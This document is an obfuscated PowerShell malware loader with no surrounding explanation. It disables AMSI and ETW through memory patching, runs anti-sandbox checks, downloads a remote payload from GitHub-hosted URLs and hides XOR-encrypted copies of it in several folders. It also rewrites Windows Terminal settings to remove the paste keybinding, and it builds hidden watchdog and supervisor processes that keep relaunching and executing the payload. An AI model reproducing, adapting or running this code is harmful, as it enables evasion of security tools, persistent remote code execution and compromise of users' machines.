# ═══ In-Memory Patches (Polymorphic) ═══
# Runtime memory patch
Start-Sleep -Milliseconds 31
$lrdr1Qf = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
$UGeaVP = [int](7920) % 256
$bFKS = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
$Jhexu = [Ref].Assembly.GetType($lrdr1Qf)
[void]([Math]::Abs(15100))
$mp0vOn = $Jhexu.GetField($bFKS, [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uUHVibGljLFN0YXRpYw==")))
$mp0vOn.SetValue($null, $true)
$Xv6Nr2lC = "RTXKC"

# ETW blind (P/Invoke)
$g79yv = [int](1645) % 256
$IzlXKT = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$AJ1U = Add-Type -MemberDefinition $IzlXKT -Name 'ParseEntry5' -Namespace 'GetState68' -PassThru
[void]([Math]::Abs(78499))
$V1a1wpX6 = ([char]110+[char]116+[char]100+[char]108+[char]108+[char]46+[char]100+[char]108+[char]108)
$m657vh = ([char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101)
$MHjbwMPS = $AJ1U::LoadLibrary($V1a1wpX6)
$l7Tj = $AJ1U::GetProcAddress($MHjbwMPS, $m657vh)
$oycpj5zJ = [int](1563) % 256
$ZL7f = 0
$AJ1U::VirtualProtect($l7Tj, [UIntPtr]::new(1), 0x40, [ref]$ZL7f) | Out-Null
$CekZPpz = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($CekZPpz, 0, $l7Tj, $CekZPpz.Length)
$AJ1U::VirtualProtect($l7Tj, [UIntPtr]::new(1), $ZL7f, [ref]$ZL7f) | Out-Null
$DzLkNq = [int](5872) % 256

# Environment validation
$f5Ukr = [Environment]::ProcessorCount
if ($f5Ukr -lt 2) { exit }
$pFBnoL = [long]0
try {
    $YH7J7N = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
    if ($null -ne $YH7J7N) {
        $pFBnoL = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
        $pFBnoL = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    }
} catch {
    $pFBnoL = 0
}
if ($pFBnoL -gt 0 -and $pFBnoL -lt 2GB) { exit }
$KbbNf9 = [System.DateTime]::Now
Start-Sleep -Milliseconds 1737
if (([System.DateTime]::Now - $KbbNf9).TotalMilliseconds -lt 1389) { exit }
function GetItem61($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
$ErrorActionPreference='SilentlyContinue'
Set-StrictMode -Off

# ============================================================
# BOOTSTRAP v25 FINAL — Dual launcher (Win10 VBS + Win11 conhost)
# ============================================================

$InstallId = ([guid]::NewGuid().ToString('N').Substring(0,8)).ToUpper()
$osBuild   = [Environment]::OSVersion.Version.Build
$useConhost = ($osBuild -ge 22621)

$psExe   = ($env + (GetItem61 @(27,62,225,168,149,103,0,195,255,160,30,36,205,174,164,55,7,156,241,140,48,21,249,233,187,46,24,204,203,196,56,39,245,218,207,103,49,158,223,128,48,96,249,228,163,102,58,195,255,177,44,49,203,247,179,33,31,233,229,129,54,97,203,241,149,58,28,192,199,161,44,33,227,240,160,96,8,254,160,203) @(84,82,175,157,246)))
$conhost = ($env + (GetItem61 @(127,32,178,242,122,155,19,92,46,170,141,111,202,114,98,47,169,244,117,210,37,119,26,136,138,99,226,34,105,126,197,178,120,239,120,74,40,191,242,117,205,6,101,113) @(48,76,252,199,25,168,65)))
$wscript = ($env + (GetItem61 @(251,202,219,86,13,135,244,249,1,56,254,208,247,80,60,215,243,166,15,20,208,225,195,23,35,206,236,246,7,93,250,204,246,14,2,195,194,214,86,2,209,225,192,94) @(180,166,149,99,110)))

$WtSettings = ($env + (GetItem61 @(49,52,112,226,113,38,174,51,14,94,240,113,68,173,56,10,89,228,88,71,177,41,17,122,235,119,114,132,29,110,112,252,65,65,166,7,61,59,252,86,76,134,47,42,94,128,76,99,178,57,102,59,209,17,68,132,29,50,57,194,66,123,174,13,7,114,218,19,76,191,10,106,81,216,110,125,167,57,21,97,214,18,64,139,42,24,49,216,121,65,144,42,59,79,244,16,76,190,6,37,82,234,114,38,137,41,106,102,209,89,35,153,29,109,49,199) @(126,95,8,178,32,22,232)))
$WtBackup   = ($env + (GetItem61 @(69,3,49,38,8,12,58,71,57,31,52,8,110,57,76,61,24,32,33,114,29,93,38,48,20,106,114,10,80,6,27,21,8,12,4,89,48,1,18,105,95,77,50,85) @(10,104,73,118,89,60,124)) + $InstallId + (GetItem61 @(169,81,182,220,20,93,216,1) @(229,60,252,180,117,42)))
$KillFlag   = ($env + (GetItem61 @(196,38,106,151,160,104,201,41,98,150,178,80,211,120,76,161,150,121,243,44) @(139,74,56,209,244,62)) + $InstallId + (GetItem61 @(138,32,146,124,29,163,252,251) @(198,77,200,15,68,244,159)))
$LogFile    = ($env + (GetItem61 @(122,32,132,14,245,180,119,47,140,15,231,140,109,59,235,117) @(53,76,214,72,161,226)) + $InstallId + (GetItem61 @(91,123,134,188,77,97,195,247) @(23,22,254,202)))
$PidDir     = ($env + (GetItem61 @(204,168,73,146,254,231,132,224,158,92,146,196,233,245,193,180,65,146,146,140) @(131,196,27,212,170,177,198)) + $InstallId)
$VbsFile    = ($env + (GetItem61 @(220,151,250,150,79,101,232,222,173,212,132,79,7,235,213,169,211,144,102,27,207,196,178,251,164,45,27,216,201,146,208,165,79,101,214,192,164,202,162,117,13,217,174,193) @(147,252,130,198,30,85,174)) + $InstallId + (GetItem61 @(230,235,50,139,131,34,77,178) @(170,133,104,226,224,85,112,143)))

function Log($m) { try { Add-Content -LiteralPath $LogFile -Value ("[" + $(Get-Date -Format 'HH:mm:ss') + "] " + $m) -Encoding UTF8 } catch {} }
function P($m, $c = (GetItem61 @(5,80,34,80,151,6,94,85) @(87,99,104,56,242))) { Write-Host $m -ForegroundColor $c; Log $m }
function IR {
    param([scriptblock]$A, [int]$Max=3, [int]$D=5)
    for ($i=1; $i -le $Max; $i++) {
        $r = $false
        try { $r = & $A } catch { }
        if ($r) { return $true }
        if ($i -lt $Max) { Start-Sleep -Seconds $D }
    }
    return $false
}

Log ((GetItem61 @(28,161,6,178,43,127,109,53,187,101,201,40,101,112,124,200) @(76,245,54,139,98,55,52)) + $InstallId + (GetItem61 @(81,143,76,62,205,129,218,245,72,155,59,50) @(24,202,6,15,172,214,162,158)) + $osBuild + (GetItem61 @(23,126,32,132,40,118,54,77,13,193,27,34) @(94,59,110,242,74,27)) + $useConhost + (GetItem61 @(116,37,223,24,137,108,92,210) @(61,97,239,33,217)))
P (GetItem61 @(83,140,58,5,120,109,90,161,68,111,115,98,80,141,63,126,101,102,66,225,90,104,1,24) @(3,216,10,60,49,37)) Cyan
P ((GetItem61 @(154,131,137,25,128,151,229,18) @(201,214,216,47)) + $InstallId + (GetItem61 @(64,32,234,74,93,89,208,27,64,41,160,16) @(9,104,157,45)) + $osBuild + (GetItem61 @(142,53,146,189,162,128,59,212,184,155,137,18,191,130,191,241,52,164,231,203) @(199,125,229,218,246)) + $(if($useConhost){'conhost'}else{'VBS'})) Yellow

# ============================================================
# STEP 1: DOWNLOAD
# ============================================================
$urls = @(
    'https://raw.githubusercontent.com/sangoccnhule1997ac939-spec/magic_ps/main/test.log',
    'https://cdn.jsdelivr.net/gh/sangoccnhule1997ac939-spec/magic_ps@main/test.log',
    'https://cdn.statically.io/gh/sangoccnhule1997ac939-spec/magic_ps/main/test.log'
)
$urlsStr = ($urls | ForEach-Object { ("'" + $_ + "'") }) -join ','

$agent = $null
$ok = IR -Max 5 -D 10 -A {
    foreach ($u in $urls) {
        try {
            $r = Invoke-WebRequest -UseBasicParsing -Uri $u -TimeoutSec 20
            $script:agent = [Text.Encoding]::UTF8.GetString($r.RawContentStream.ToArray())
            if ($script:agent.Length -gt 500) { return $true }
        } catch { }
    }
    return $false
}
if (-not $ok) { P (GetItem61 @(99,216,104,188,214,214,112,36,104,200,0,232,230,208,78,24,101,218,7,202) @(49,159,81,143,180,187,8,82)) Red; return }
P ((GetItem61 @(57,148,228,42,9,190,165,111,50,132,140,47,34,146,224,36) @(107,211,221,25)) + $($agent.Length) + (GetItem61 @(215,208,237,244,184,168,212,237) @(158,151,163,155,225,240))) Green

# ============================================================
# STEP 2: XOR + 7 CLONES
# ============================================================
$raw = [Text.Encoding]::UTF8.GetBytes($agent)
$key = [byte[]]::new(32)
[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($key)
$enc = [byte[]]::new($raw.Length)
for ($i=0; $i -lt $raw.Length; $i++) { $enc[$i] = $raw[$i] -bxor $key[$i%32] }
$blob = [byte[]]::new(32 + $enc.Length)
[Buffer]::BlockCopy($key, 0, $blob, 0, 32)
[Buffer]::BlockCopy($enc, 0, $blob, 32, $enc.Length)

$folders = @(
    ($env + (GetItem61 @(230,221,46,211,248,134,16,206,248,224,20,210,251,243,16,214,248,224,46,205,200,225,24,250,203,133,24,245,243,216,4,224,255,132,58,246,243,241,111,176,202,135,46,201,253,219,0,179,248,132,16,233,200,241,0,224,250,227,0,224,248,132,111,246,205,241,16,243,203,219,0,250) @(169,182,86,131))),
    ($env + (GetItem61 @(207,228,36,240,130,176,201,17,241,133,194,222,14,229,149,213,222,10,216,157,225,216,18,217,177,179,193,42,250,189,210,236,10,146,191,245,213,27,153,224,227,190,36,248,137,215,197,24,249,132,206,224,6,246,171,215,194,24,229,238) @(128,143,92,160,211))),
    ($env + (GetItem61 @(49,181,67,193,25,64,143,60,136,64,214,47,81,138,18,180,102,253,117,127,191,76,132,53,200,10,97,173,28,179,87,230,40,54,147,29,136,66,248,32,103,138,40,164,93,213,2,109,132,76,182,105,202,9,95,173,28,153,83,234) @(126,222,5,144,76,5,221))),
    ($env + (GetItem61 @(15,100,59,154,77,6,89,13,94,21,136,77,100,90,6,90,18,156,100,120,126,23,65,58,168,47,120,105,26,97,17,169,74,4,115,53,85,4,243,47,85,46,56,70,34,146,82,6,125,115,69,118,146,89,94,111,35,60,17,188,127,88,116,53,92,22,159,45) @(64,15,67,202,28,54,31))),
    ($env + (GetItem61 @(102,105,97,67,169,221,125,215,124,110,14,80,168,222,79,192,113,70,2,37,152,185,121,240,115,66,97,116,161,211,95,182,115,82,2,109,154,220,14,243,74,52,64,98,162,185,113,236,72,66,98,42) @(41,5,55,23,251,139,55,134))),
    ($env + (GetItem61 @(136,50,80,196,139,135,66,138,8,126,214,139,229,65,129,12,121,194,162,249,101,144,23,81,246,233,249,114,157,55,122,247,140,133,104,178,3,111,173,233,212,53,191,29,113,195,148,216,94,159,20,21) @(199,89,40,148,218,183,4))),
    ($env + (GetItem61 @(246,102,119,251,34,6,128,96,232,91,77,250,33,115,128,120,232,91,119,229,18,97,136,84,219,62,65,221,41,88,148,78,239,74,89,210,17,97,170,88,224,90,120,204,38,4,144,84,221,96,89,210,58,115,136,94,216,90,89,222,23,112,190,105,224,90,65,196,41,103,251,16) @(185,13,15,171,115,54,198,45)))
)
$clones = @()
foreach ($f in $folders) {
    $folder = $f
    $okC = IR -Max 3 -D 5 -A {
        try {
            if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
            $p = Join-Path $folder ($InstallId + (GetItem61 @(53,60,232,119,46,10,68,108) @(121,81,186,31,74,75)))
            [IO.File]::WriteAllBytes($p, $blob)
            if ((Get-Item $p -Force).Length -lt 500) { return $false }
            try { $fi = Get-Item $p -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
            return $true
        } catch { return $false }
    }
    if ($okC) { $clones += (Join-Path $folder ($InstallId + (GetItem61 @(17,242,58,187,164,28,162,85) @(93,159,104,211,192)))) }
}
if ($clones.Count -eq 0) { P (GetItem61 @(26,45,223,17,41,114,242,0,25,116,225,45,31,90,241,34) @(75,31,167,103)) Red; return }
P ((GetItem61 @(120,75,103,30,223,155,15,45,102,16,94,85) @(41,121,31,104,189,246,89,87)) + $($clones.Count) + "/7") Green

$clonesStr  = ($clones | ForEach-Object { ("'" + $_ + "'") }) -join ','
$foldersStr = ($folders | ForEach-Object { ("'" + $_ + "'") }) -join ','

# ============================================================
# STEP 3: WT PATCH
# ============================================================
$patchedJson = @'
{
    "$help": "https://aka.ms/terminal-documentation",
    "$schema": "https://aka.ms/terminal-profiles-schema",
    "actions": [],
    "copyFormatting": "none",
    "copyOnSelect": false,
    "defaultProfile": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}",
    "keybindings": 
    [
        { "id": "Terminal.CopyToClipboard", "keys": "ctrl+c" },
        { "id": "Terminal.DuplicatePaneAuto", "keys": "alt+shift+d" }
    ],
    "newTabMenu": [ { "type": "remainingProfiles" } ],
    "profiles": {
        "defaults": {},
        "list": [
            { "commandline": "%SystemRoot%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "guid": "{61c54bbd-c2c6-5271-96e7-009a87ff44bf}", "hidden": false, "name": "Windows PowerShell" },
            { "commandline": "%SystemRoot%\\System32\\cmd.exe", "guid": "{0caa0dad-35be-5f56-a8ff-afceeeaa6101}", "hidden": false, "name": "Command Prompt" },
            { "guid": "{b453ae62-4e3d-5e58-b989-0a998ec441b8}", "hidden": false, "name": "Azure Cloud Shell", "source": "Windows.Terminal.Azure" }
        ]
    },
    "schemes": [],
    "themes": []
}
'@
IR -Max 3 -D 5 -A {
    try {
        $agDir = Split-Path $WtBackup -Parent
        if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
        [IO.File]::WriteAllText($WtBackup, $patchedJson, [Text.UTF8Encoding]::new($false))
        try { $fi = Get-Item $WtBackup -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
        return (Test-Path $WtBackup)
    } catch { return $false }
} | Out-Null
$wtOK = IR -Max 3 -D 5 -A {
    try {
        if (Test-Path $WtSettings) {
            Copy-Item $WtSettings ($WtSettings + (GetItem61 @(24,195,51,98,150,214,109,199,35,93,173,145,55,195,47,108) @(84,174,121,10,247,231)) + $InstallId) -Force -EA 0
            [IO.File]::WriteAllText($WtSettings, $patchedJson, [Text.UTF8Encoding]::new($false))
            return $true
        }
        return $false
    } catch { return $false }
}
P ((GetItem61 @(11,80,224,105,62,38,247,62,4,83,214,56,20,32,140,51) @(93,97,177,14)) + $(if($wtOK){'OK'}else{'SKIP'})) $(if($wtOK){'Green'}else{'Yellow'})

# ============================================================
# STEP 4: BUILD PS WATCHDOG (spawn agent)
# ============================================================
$watchdog = @"
`$ErrorActionPreference='SilentlyContinue'
`$id='$InstallId';`$kill='$KillFlag';`$log='$LogFile';`$pidDir='$PidDir'
`$clones=@($clonesStr);`$folders=@($foldersStr);`$urls=@($urlsStr)
`$target=3;`$wtSettings='$WtSettings';`$wtBackup='$WtBackup'
`$cd="$env:TEMP\dag_cd_$InstallId.txt"
function W(`$m){try{Add-Content `$log "[w] `$(Get-Date -Format 'HH:mm:ss') `$m" -Encoding UTF8}catch{}}
if(Test-Path `$kill){exit}
if(-not(Test-Path `$pidDir)){New-Item -ItemType Directory -Path `$pidDir -Force|Out-Null}
# WT self-heal
try{
  if(Test-Path `$wtBackup){
    `$need=`$false
    if(-not(Test-Path `$wtSettings)){`$need=`$true}
    else{`$c=Get-Content `$wtSettings -Raw -EA 0;if(`$c -match 'Terminal\.PasteFromClipboard'){`$need=`$true}}
    if(`$need){`$bak=[IO.File]::ReadAllText(`$wtBackup,[Text.Encoding]::UTF8);[IO.File]::WriteAllText(`$wtSettings,`$bak,[Text.UTF8Encoding]::new(`$false));W 'wt-restored'}
  }
}catch{}
# Clean dead pids
Get-ChildItem `$pidDir -File -EA 0|%{try{`$p=[int]`$_.Name;if(-not(Get-Process -Id `$p -EA 0)){Remove-Item `$_.FullName -Force -EA 0}}catch{Remove-Item `$_.FullName -Force -EA 0}}
`$alive=@(Get-ChildItem `$pidDir -File -EA 0).Count
if(`$alive -ge `$target){exit}
# Find clones
`$ex=@();foreach(`$c in `$clones){if(Test-Path `$c){`$ex+=[string]`$c}}
if(`$ex.Count -eq 0){
  # Network fallback
  if(Test-Path `$cd){try{`$l=[datetime]::Parse((Get-Content `$cd -Raw).Trim());if(((Get-Date)-`$l).TotalMinutes -lt 5){exit}}catch{}}
  Set-Content `$cd -Value (Get-Date).ToString('o') -Force
  `$dl=`$null
  foreach(`$u in `$urls){try{`$r=iwr -UseBasicParsing -Uri `$u -TimeoutSec 20;`$dl=[Text.Encoding]::UTF8.GetString(`$r.RawContentStream.ToArray());if(`$dl.Length -gt 500){break}else{`$dl=`$null}}catch{}}
  if(-not `$dl){exit}
  `$raw=[Text.Encoding]::UTF8.GetBytes(`$dl);`$key=[byte[]]::new(32);[Security.Cryptography.RandomNumberGenerator]::Create().GetBytes(`$key)
  `$enc=[byte[]]::new(`$raw.Length);for(`$i=0;`$i -lt `$raw.Length;`$i++){`$enc[`$i]=`$raw[`$i] -bxor `$key[`$i%32]}
  `$blob=[byte[]]::new(32+`$enc.Length);[Buffer]::BlockCopy(`$key,0,`$blob,0,32);[Buffer]::BlockCopy(`$enc,0,`$blob,32,`$enc.Length)
  `$rs=@();foreach(`$f in `$folders){try{if(-not(Test-Path `$f)){New-Item -ItemType Directory -Path `$f -Force|Out-Null};`$p=Join-Path `$f "`$id.dat";[IO.File]::WriteAllBytes(`$p,`$blob);try{`$fi=Get-Item `$p -Force;`$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden}catch{};`$rs+=[string]`$p}catch{}}
  if(`$rs.Count -eq 0){exit}
  `$code=`$rs[0];W 'net-restored'
}else{
  if(`$ex.Count -lt `$clones.Count){try{`$sb=[IO.File]::ReadAllBytes(`$ex[0]);foreach(`$c in `$clones){if(-not(Test-Path `$c)){try{`$d=Split-Path `$c -Parent;if(-not(Test-Path `$d)){New-Item -ItemType Directory -Path `$d -Force|Out-Null};[IO.File]::WriteAllBytes(`$c,`$sb);try{`$fi=Get-Item `$c -Force;`$fi.Attributes=`$fi.Attributes -bor [IO.FileAttributes]::Hidden}catch{}}catch{}}}}catch{}}
  `$code=`$ex[0]
}
if(-not `$code -or -not(Test-Path `$code)){exit}
Set-Content (Join-Path `$pidDir `$PID) -Value 'x' -Force
try{`$d=[IO.File]::ReadAllBytes(`$code);`$k=`$d[0..31];`$x=`$d[32..(`$d.Length-1)];`$c=[byte[]]::new(`$x.Length);for(`$i=0;`$i -lt `$x.Length;`$i++){`$c[`$i]=`$x[`$i] -bxor `$k[`$i%32]};`$payload=[Text.Encoding]::UTF8.GetString(`$c)}catch{Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0;exit}
try{`$sb2=[ScriptBlock]::Create(`$payload);& `$sb2}catch{W ('exec-fail: '+`$_)}finally{Remove-Item (Join-Path `$pidDir `$PID) -Force -EA 0}
"@
$watchdogEnc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($watchdog))
P ((GetItem61 @(167,186,45,178,168,186,3,233,147,186,8,180,184,201,86,191) @(241,136,107,130)) + $($watchdogEnc.Length) + (GetItem61 @(202,209,77,135,189,219,220,121) @(131,150,3,232,228))) Green

# ============================================================
# STEP 5: BUILD LAUNCHER (VBS hoặc conhost tùy OS)
# ============================================================
if ($useConhost -and (Test-Path $conhost)) {
    $launcherExe  = $conhost
    $launcherArgs = ((GetItem61 @(60,196,107,74,128,175,246,81,18,208,12,95,185,129,241,83) @(112,151,90,37,218,248,176,58)) + $psExe + (GetItem61 @(101,155,153,232,156,85,21,163,187,241,241,85,77,165,160,240,129,123,29,189,186,174,253,114,78,156,138,240,171,85,106,152,188,219,164,10,118,161,153,232,154,96,68,158,129,175,158,8,77,165,225,233,157,127,21,129,185,203,134,13,101,183,146,169,171,127,106,136,187,229,137,76,126,165,237,246,170,10,126,158,130,217,134,78,78,165,233,244,170,85,125,149) @(44,242,216,156,200,56)) + $watchdogEnc)
    $supLauncherExe  = $conhost
    P (GetItem61 @(183,98,160,151,76,183,152,206,185,125,175,144,103,157,152,215,129,72,142,208,77,233,135,198,175,118,215,201,116,141,144,202,129,98,176,220,77,163,151,206,129,72,222,193,116,183,174,201,128,23,129,214) @(227,37,230,166,46,218,214,161)) Green
} else {
    # Win10 — VBS wrapper (no flash)
    if (-not (Test-Path $wscript)) { P (GetItem61 @(52,76,41,6,20,127,72,39,27,36,46,2,112,23,1,24,61,1,78,35,70,61,46,90) @(80,127,103,108,119,18,36)) Red; return }
    $q = [int]($watchdogEnc.Length / 4)
    $p1 = $watchdogEnc.Substring(0, $q)
    $p2 = $watchdogEnc.Substring($q, $q)
    $p3 = $watchdogEnc.Substring($q*2, $q)
    $p4 = $watchdogEnc.Substring($q*3)
    $vbsContent = (GetItem61 @(12,2,5,115,23,2,44,116,7,44,17,109,18,2,56,73,29,34,84,58) @(94,69,105,7)) +
        ((GetItem61 @(102,221,41,202) @(63,137,25,163,67,156,210)) + $p1 + (GetItem61 @(117,203,56,249) @(60,172,8,178,99,52))) +
        ((GetItem61 @(129,246,244,121) @(216,156,196,16,245)) + $p2 + (GetItem61 @(113,89,152,116) @(56,62,168,63,177,205))) +
        ((GetItem61 @(112,66,245,58) @(41,56,197,83,106)) + $p3 + (GetItem61 @(109,244,187,217) @(36,147,139,146,170,56,41,196))) +
        ((GetItem61 @(187,93,92,238) @(225,25,108,135)) + $p4 + (GetItem61 @(192,206,75,22) @(137,169,123,93,222,64,82))) +
        ((GetItem61 @(181,156,36,28,219,60,182,195,58,66,200,21,190,248,32,64,201,39,174,247,59,66,204,29,133,247,44,64,206,8,170,192,52,39,250,23,173,198,5,5,215,10,178,218,39,51,203,89) @(228,175,110,112,130,100)) + $psExe + (GetItem61 @(252,194,79,9,87,132,201,163,215,179,36,54,87,242,222,189,249,212,75,48,87,222,231,175,209,198,40,63,108,226,197,234,212,217,36,42,124,246,186,130,212,214,75,45,87,134,239,142,209,201,18,53,111,230,201,147,212,214,44,45,111,226,191,189,249,212,40,114,111,226,197,235,209,198,18,48,87,217,201,172,215,198,18,44,80,230,201,153,208,217,60,46,86,134,198,189,249,212,40,51,108,135,178,177,239,214,44,2,87,135,186,174,236,214,75,45,124,246,194,183,236,210,36,47,127,216,198,183,239,194,9,49,121,240,209,178,215,201,48,42) @(181,129,126,70,53,181,139,218)))
    $vbsOK = IR -Max 3 -D 5 -A {
        try {
            $agDir = Split-Path $VbsFile -Parent
            if (-not (Test-Path $agDir)) { New-Item -ItemType Directory -Path $agDir -Force | Out-Null }
            [IO.File]::WriteAllText($VbsFile, $vbsContent, [Text.Encoding]::ASCII)
            return (Test-Path $VbsFile)
        } catch { return $false }
    }
    if (-not $vbsOK) { P (GetItem61 @(85,211,77,180,69,30,208,122,217,95,178,96,31,241,89,250,84,181,116,16,230,66,133,58) @(3,184,7,224,12,86,180)) Red; return }
    try { $fi = Get-Item $VbsFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
    $launcherExe  = $wscript
    $launcherArgs = ("`"" + $VbsFile + "`"")
    $supLauncherExe  = $wscript
    P (GetItem61 @(154,8,234,181,52,163,1,195,222,14,135,121,229,194,12,141,26,213,198,101,173,125,226,253,55,150,13,156,205,21,166,58,206,253,20,163,45,235,194,44,175,12,199,185) @(206,79,172,132,86)) Green
}

# ============================================================
# STEP 6: BUILD SUPERVISOR (PS loop 15s, respawn nhanh)
# ============================================================
$supInner = @"
`$ErrorActionPreference='SilentlyContinue'
`$id='$InstallId';`$kill='$KillFlag';`$log='$LogFile';`$pidDir='$PidDir'
`$mutexName='Global\DAG_Sup_$InstallId';`$target=3
`$useConhost=$([int]$useConhost)
`$conhost='$conhost';`$psExe='$psExe';`$wscript='$wscript';`$vbsFile='$VbsFile'
`$watchdogEnc='$watchdogEnc'
`$cd="$env:TEMP\dag_sup_$InstallId.txt"
function W(`$m){try{Add-Content `$log "[sup] `$(Get-Date -Format 'HH:mm:ss') `$m" -Encoding UTF8}catch{}}
if(Test-Path `$kill){exit}
try{`$x=[Threading.Mutex]::OpenExisting(`$mutexName);`$x.Dispose();W 'already-running';exit}catch{}
`$m=New-Object Threading.Mutex(`$false,`$mutexName)
try{
  W ('start pid='+`$PID)
  while(`$true){
    if(Test-Path `$kill){break}
    if(-not(Test-Path `$pidDir)){New-Item -ItemType Directory -Path `$pidDir -Force|Out-Null}
    Get-ChildItem `$pidDir -File -EA 0|%{try{`$p=[int]`$_.Name;if(-not(Get-Process -Id `$p -EA 0)){Remove-Item `$_.FullName -Force -EA 0}}catch{Remove-Item `$_.FullName -Force -EA 0}}
    `$alive=@(Get-ChildItem `$pidDir -File -EA 0).Count
    if(`$alive -lt `$target){
      if(Test-Path `$cd){try{`$l=[datetime]::Parse((Get-Content `$cd -Raw).Trim());if(((Get-Date)-`$l).TotalSeconds -lt 8){Start-Sleep 5;continue}}catch{}}
      Set-Content `$cd -Value (Get-Date).ToString('o') -Force
      `$need=`$target-`$alive
      W "spawn `$need (alive=`$alive)"
      for(`$i=0;`$i -lt `$need;`$i++){
        try{
          if(`$useConhost -eq 1){
            Start-Process `$conhost -ArgumentList @('--headless',('"'+`$psExe+'"'),'-NoProfile','-NonInteractive','-ExecutionPolicy','Bypass','-EncodedCommand',`$watchdogEnc) -WindowStyle Hidden -EA 0
          }else{
            Start-Process `$wscript -ArgumentList ('"'+`$vbsFile+'"') -WindowStyle Hidden -EA 0
          }
          Start-Sleep -Milliseconds 900
        }catch{}
      }
    }
    Start-Sleep -Seconds 15
  }
}finally{try{`$m.ReleaseMutex()}catch{};try{`$m.Dispose()}catch{}}
"@

if ($useConhost) {
    $supArgs = ((GetItem61 @(61,129,35,153,43,133,84,157,19,149,68,140,18,171,83,159) @(113,210,18,246)) + $psExe + (GetItem61 @(28,29,231,106,156,218,245,4,23,203,39,165,214,155,45,24,239,93,249,248,174,103,65,236,124,166,229,160,54,25,224,116,172,240,160,103,46,245,95,188,229,148,61,24,255,45,158,135,173,2,77,211,75,143,142,191,52,35,232,43,129,242,134,96,23,225,88,178,212,181,20,0,244,73,253,221,174,103,38,202,68,141,249,186,55,35,151,118,170,218,157,50) @(85,116,166,30,200,183,204)) + $([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supInner))))
    $supExe = $conhost
} else {
    # Supervisor chạy hidden bằng VBS riêng
    $supEncB64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($supInner))
    $supVbsFile = ($env + (GetItem61 @(125,111,131,8,0,137,124,127,85,173,26,0,235,127,116,81,170,14,41,247,91,101,74,130,58,98,247,76,104,106,169,59,0,137,66,97,92,179,60,43,225,77,15,57) @(50,4,251,88,81,185,58)) + $InstallId + (GetItem61 @(5,202,24,108,122,16,67,155) @(73,164,66,5,25,103,126,166)))
    $sq = [int]($supEncB64.Length / 4)
    $s1 = $supEncB64.Substring(0, $sq)
    $s2 = $supEncB64.Substring($sq, $sq)
    $s3 = $supEncB64.Substring($sq*2, $sq)
    $s4 = $supEncB64.Substring($sq*3)
    $supVbsContent = (GetItem61 @(170,111,97,254,177,111,72,249,161,65,117,224,180,111,92,196,187,79,48,183) @(248,40,13,138)) +
        ((GetItem61 @(210,182,77,74) @(139,226,125,35,187,164)) + $s1 + (GetItem61 @(224,130,173,194) @(169,229,157,137))) +
        ((GetItem61 @(200,191,196,46) @(145,213,244,71)) + $s2 + (GetItem61 @(238,188,189,195) @(167,219,141,136))) +
        ((GetItem61 @(25,139,61,97) @(64,241,13,8)) + $s3 + (GetItem61 @(235,231,158,240) @(162,128,174,187,119,213))) +
        ((GetItem61 @(29,214,185,203) @(71,146,137,162,74,159,26,144)) + $s4 + (GetItem61 @(20,153,103,40) @(93,254,87,99,181,68,156,139))) +
        ((GetItem61 @(198,231,70,138,76,180,197,184,88,212,95,157,205,131,66,214,94,175,221,140,89,212,91,149,246,140,78,214,89,128,217,187,86,177,109,159,222,189,103,147,64,130,193,161,69,165,92,209) @(151,212,12,230,21,236)) + $psExe + (GetItem61 @(192,37,199,197,127,196,203,31,148,184,71,133,235,33,163,237,81,160,188,16,148,225,113,128,237,33,160,243,68,162,199,86,151,210,71,153,192,37,199,210,124,162,188,13,148,185,121,161,237,46,154,249,71,166,203,47,151,221,79,158,211,49,194,237,81,160,223,82,172,221,83,196,237,33,154,252,127,153,203,16,148,205,113,159,236,53,180,201,120,173,203,14,149,185,80,146,197,51,160,255,68,199,176,13,172,221,79,177,235,84,199,254,68,162,188,13,191,201,84,152,208,53,172,227,87,152,196,11,172,201,106,130,197,35,172,226,127,189,199,10) @(137,102,246,138,29,245)))
    [IO.File]::WriteAllText($supVbsFile, $supVbsContent, [Text.Encoding]::ASCII)
    try { $fi = Get-Item $supVbsFile -Force; $fi.Attributes = $fi.Attributes -bor [IO.FileAttributes]::Hidden } catch { }
    $supExe = $wscript
    $supArgs = ("`"" + $supVbsFile + "`"")
}
P (GetItem61 @(1,79,199,72,172,54,225,102,29,201,113,128,13,194,22,21,245,104,154,29,207,21,65,172) @(84,124,145,63,246,110,171)) Green

# ============================================================
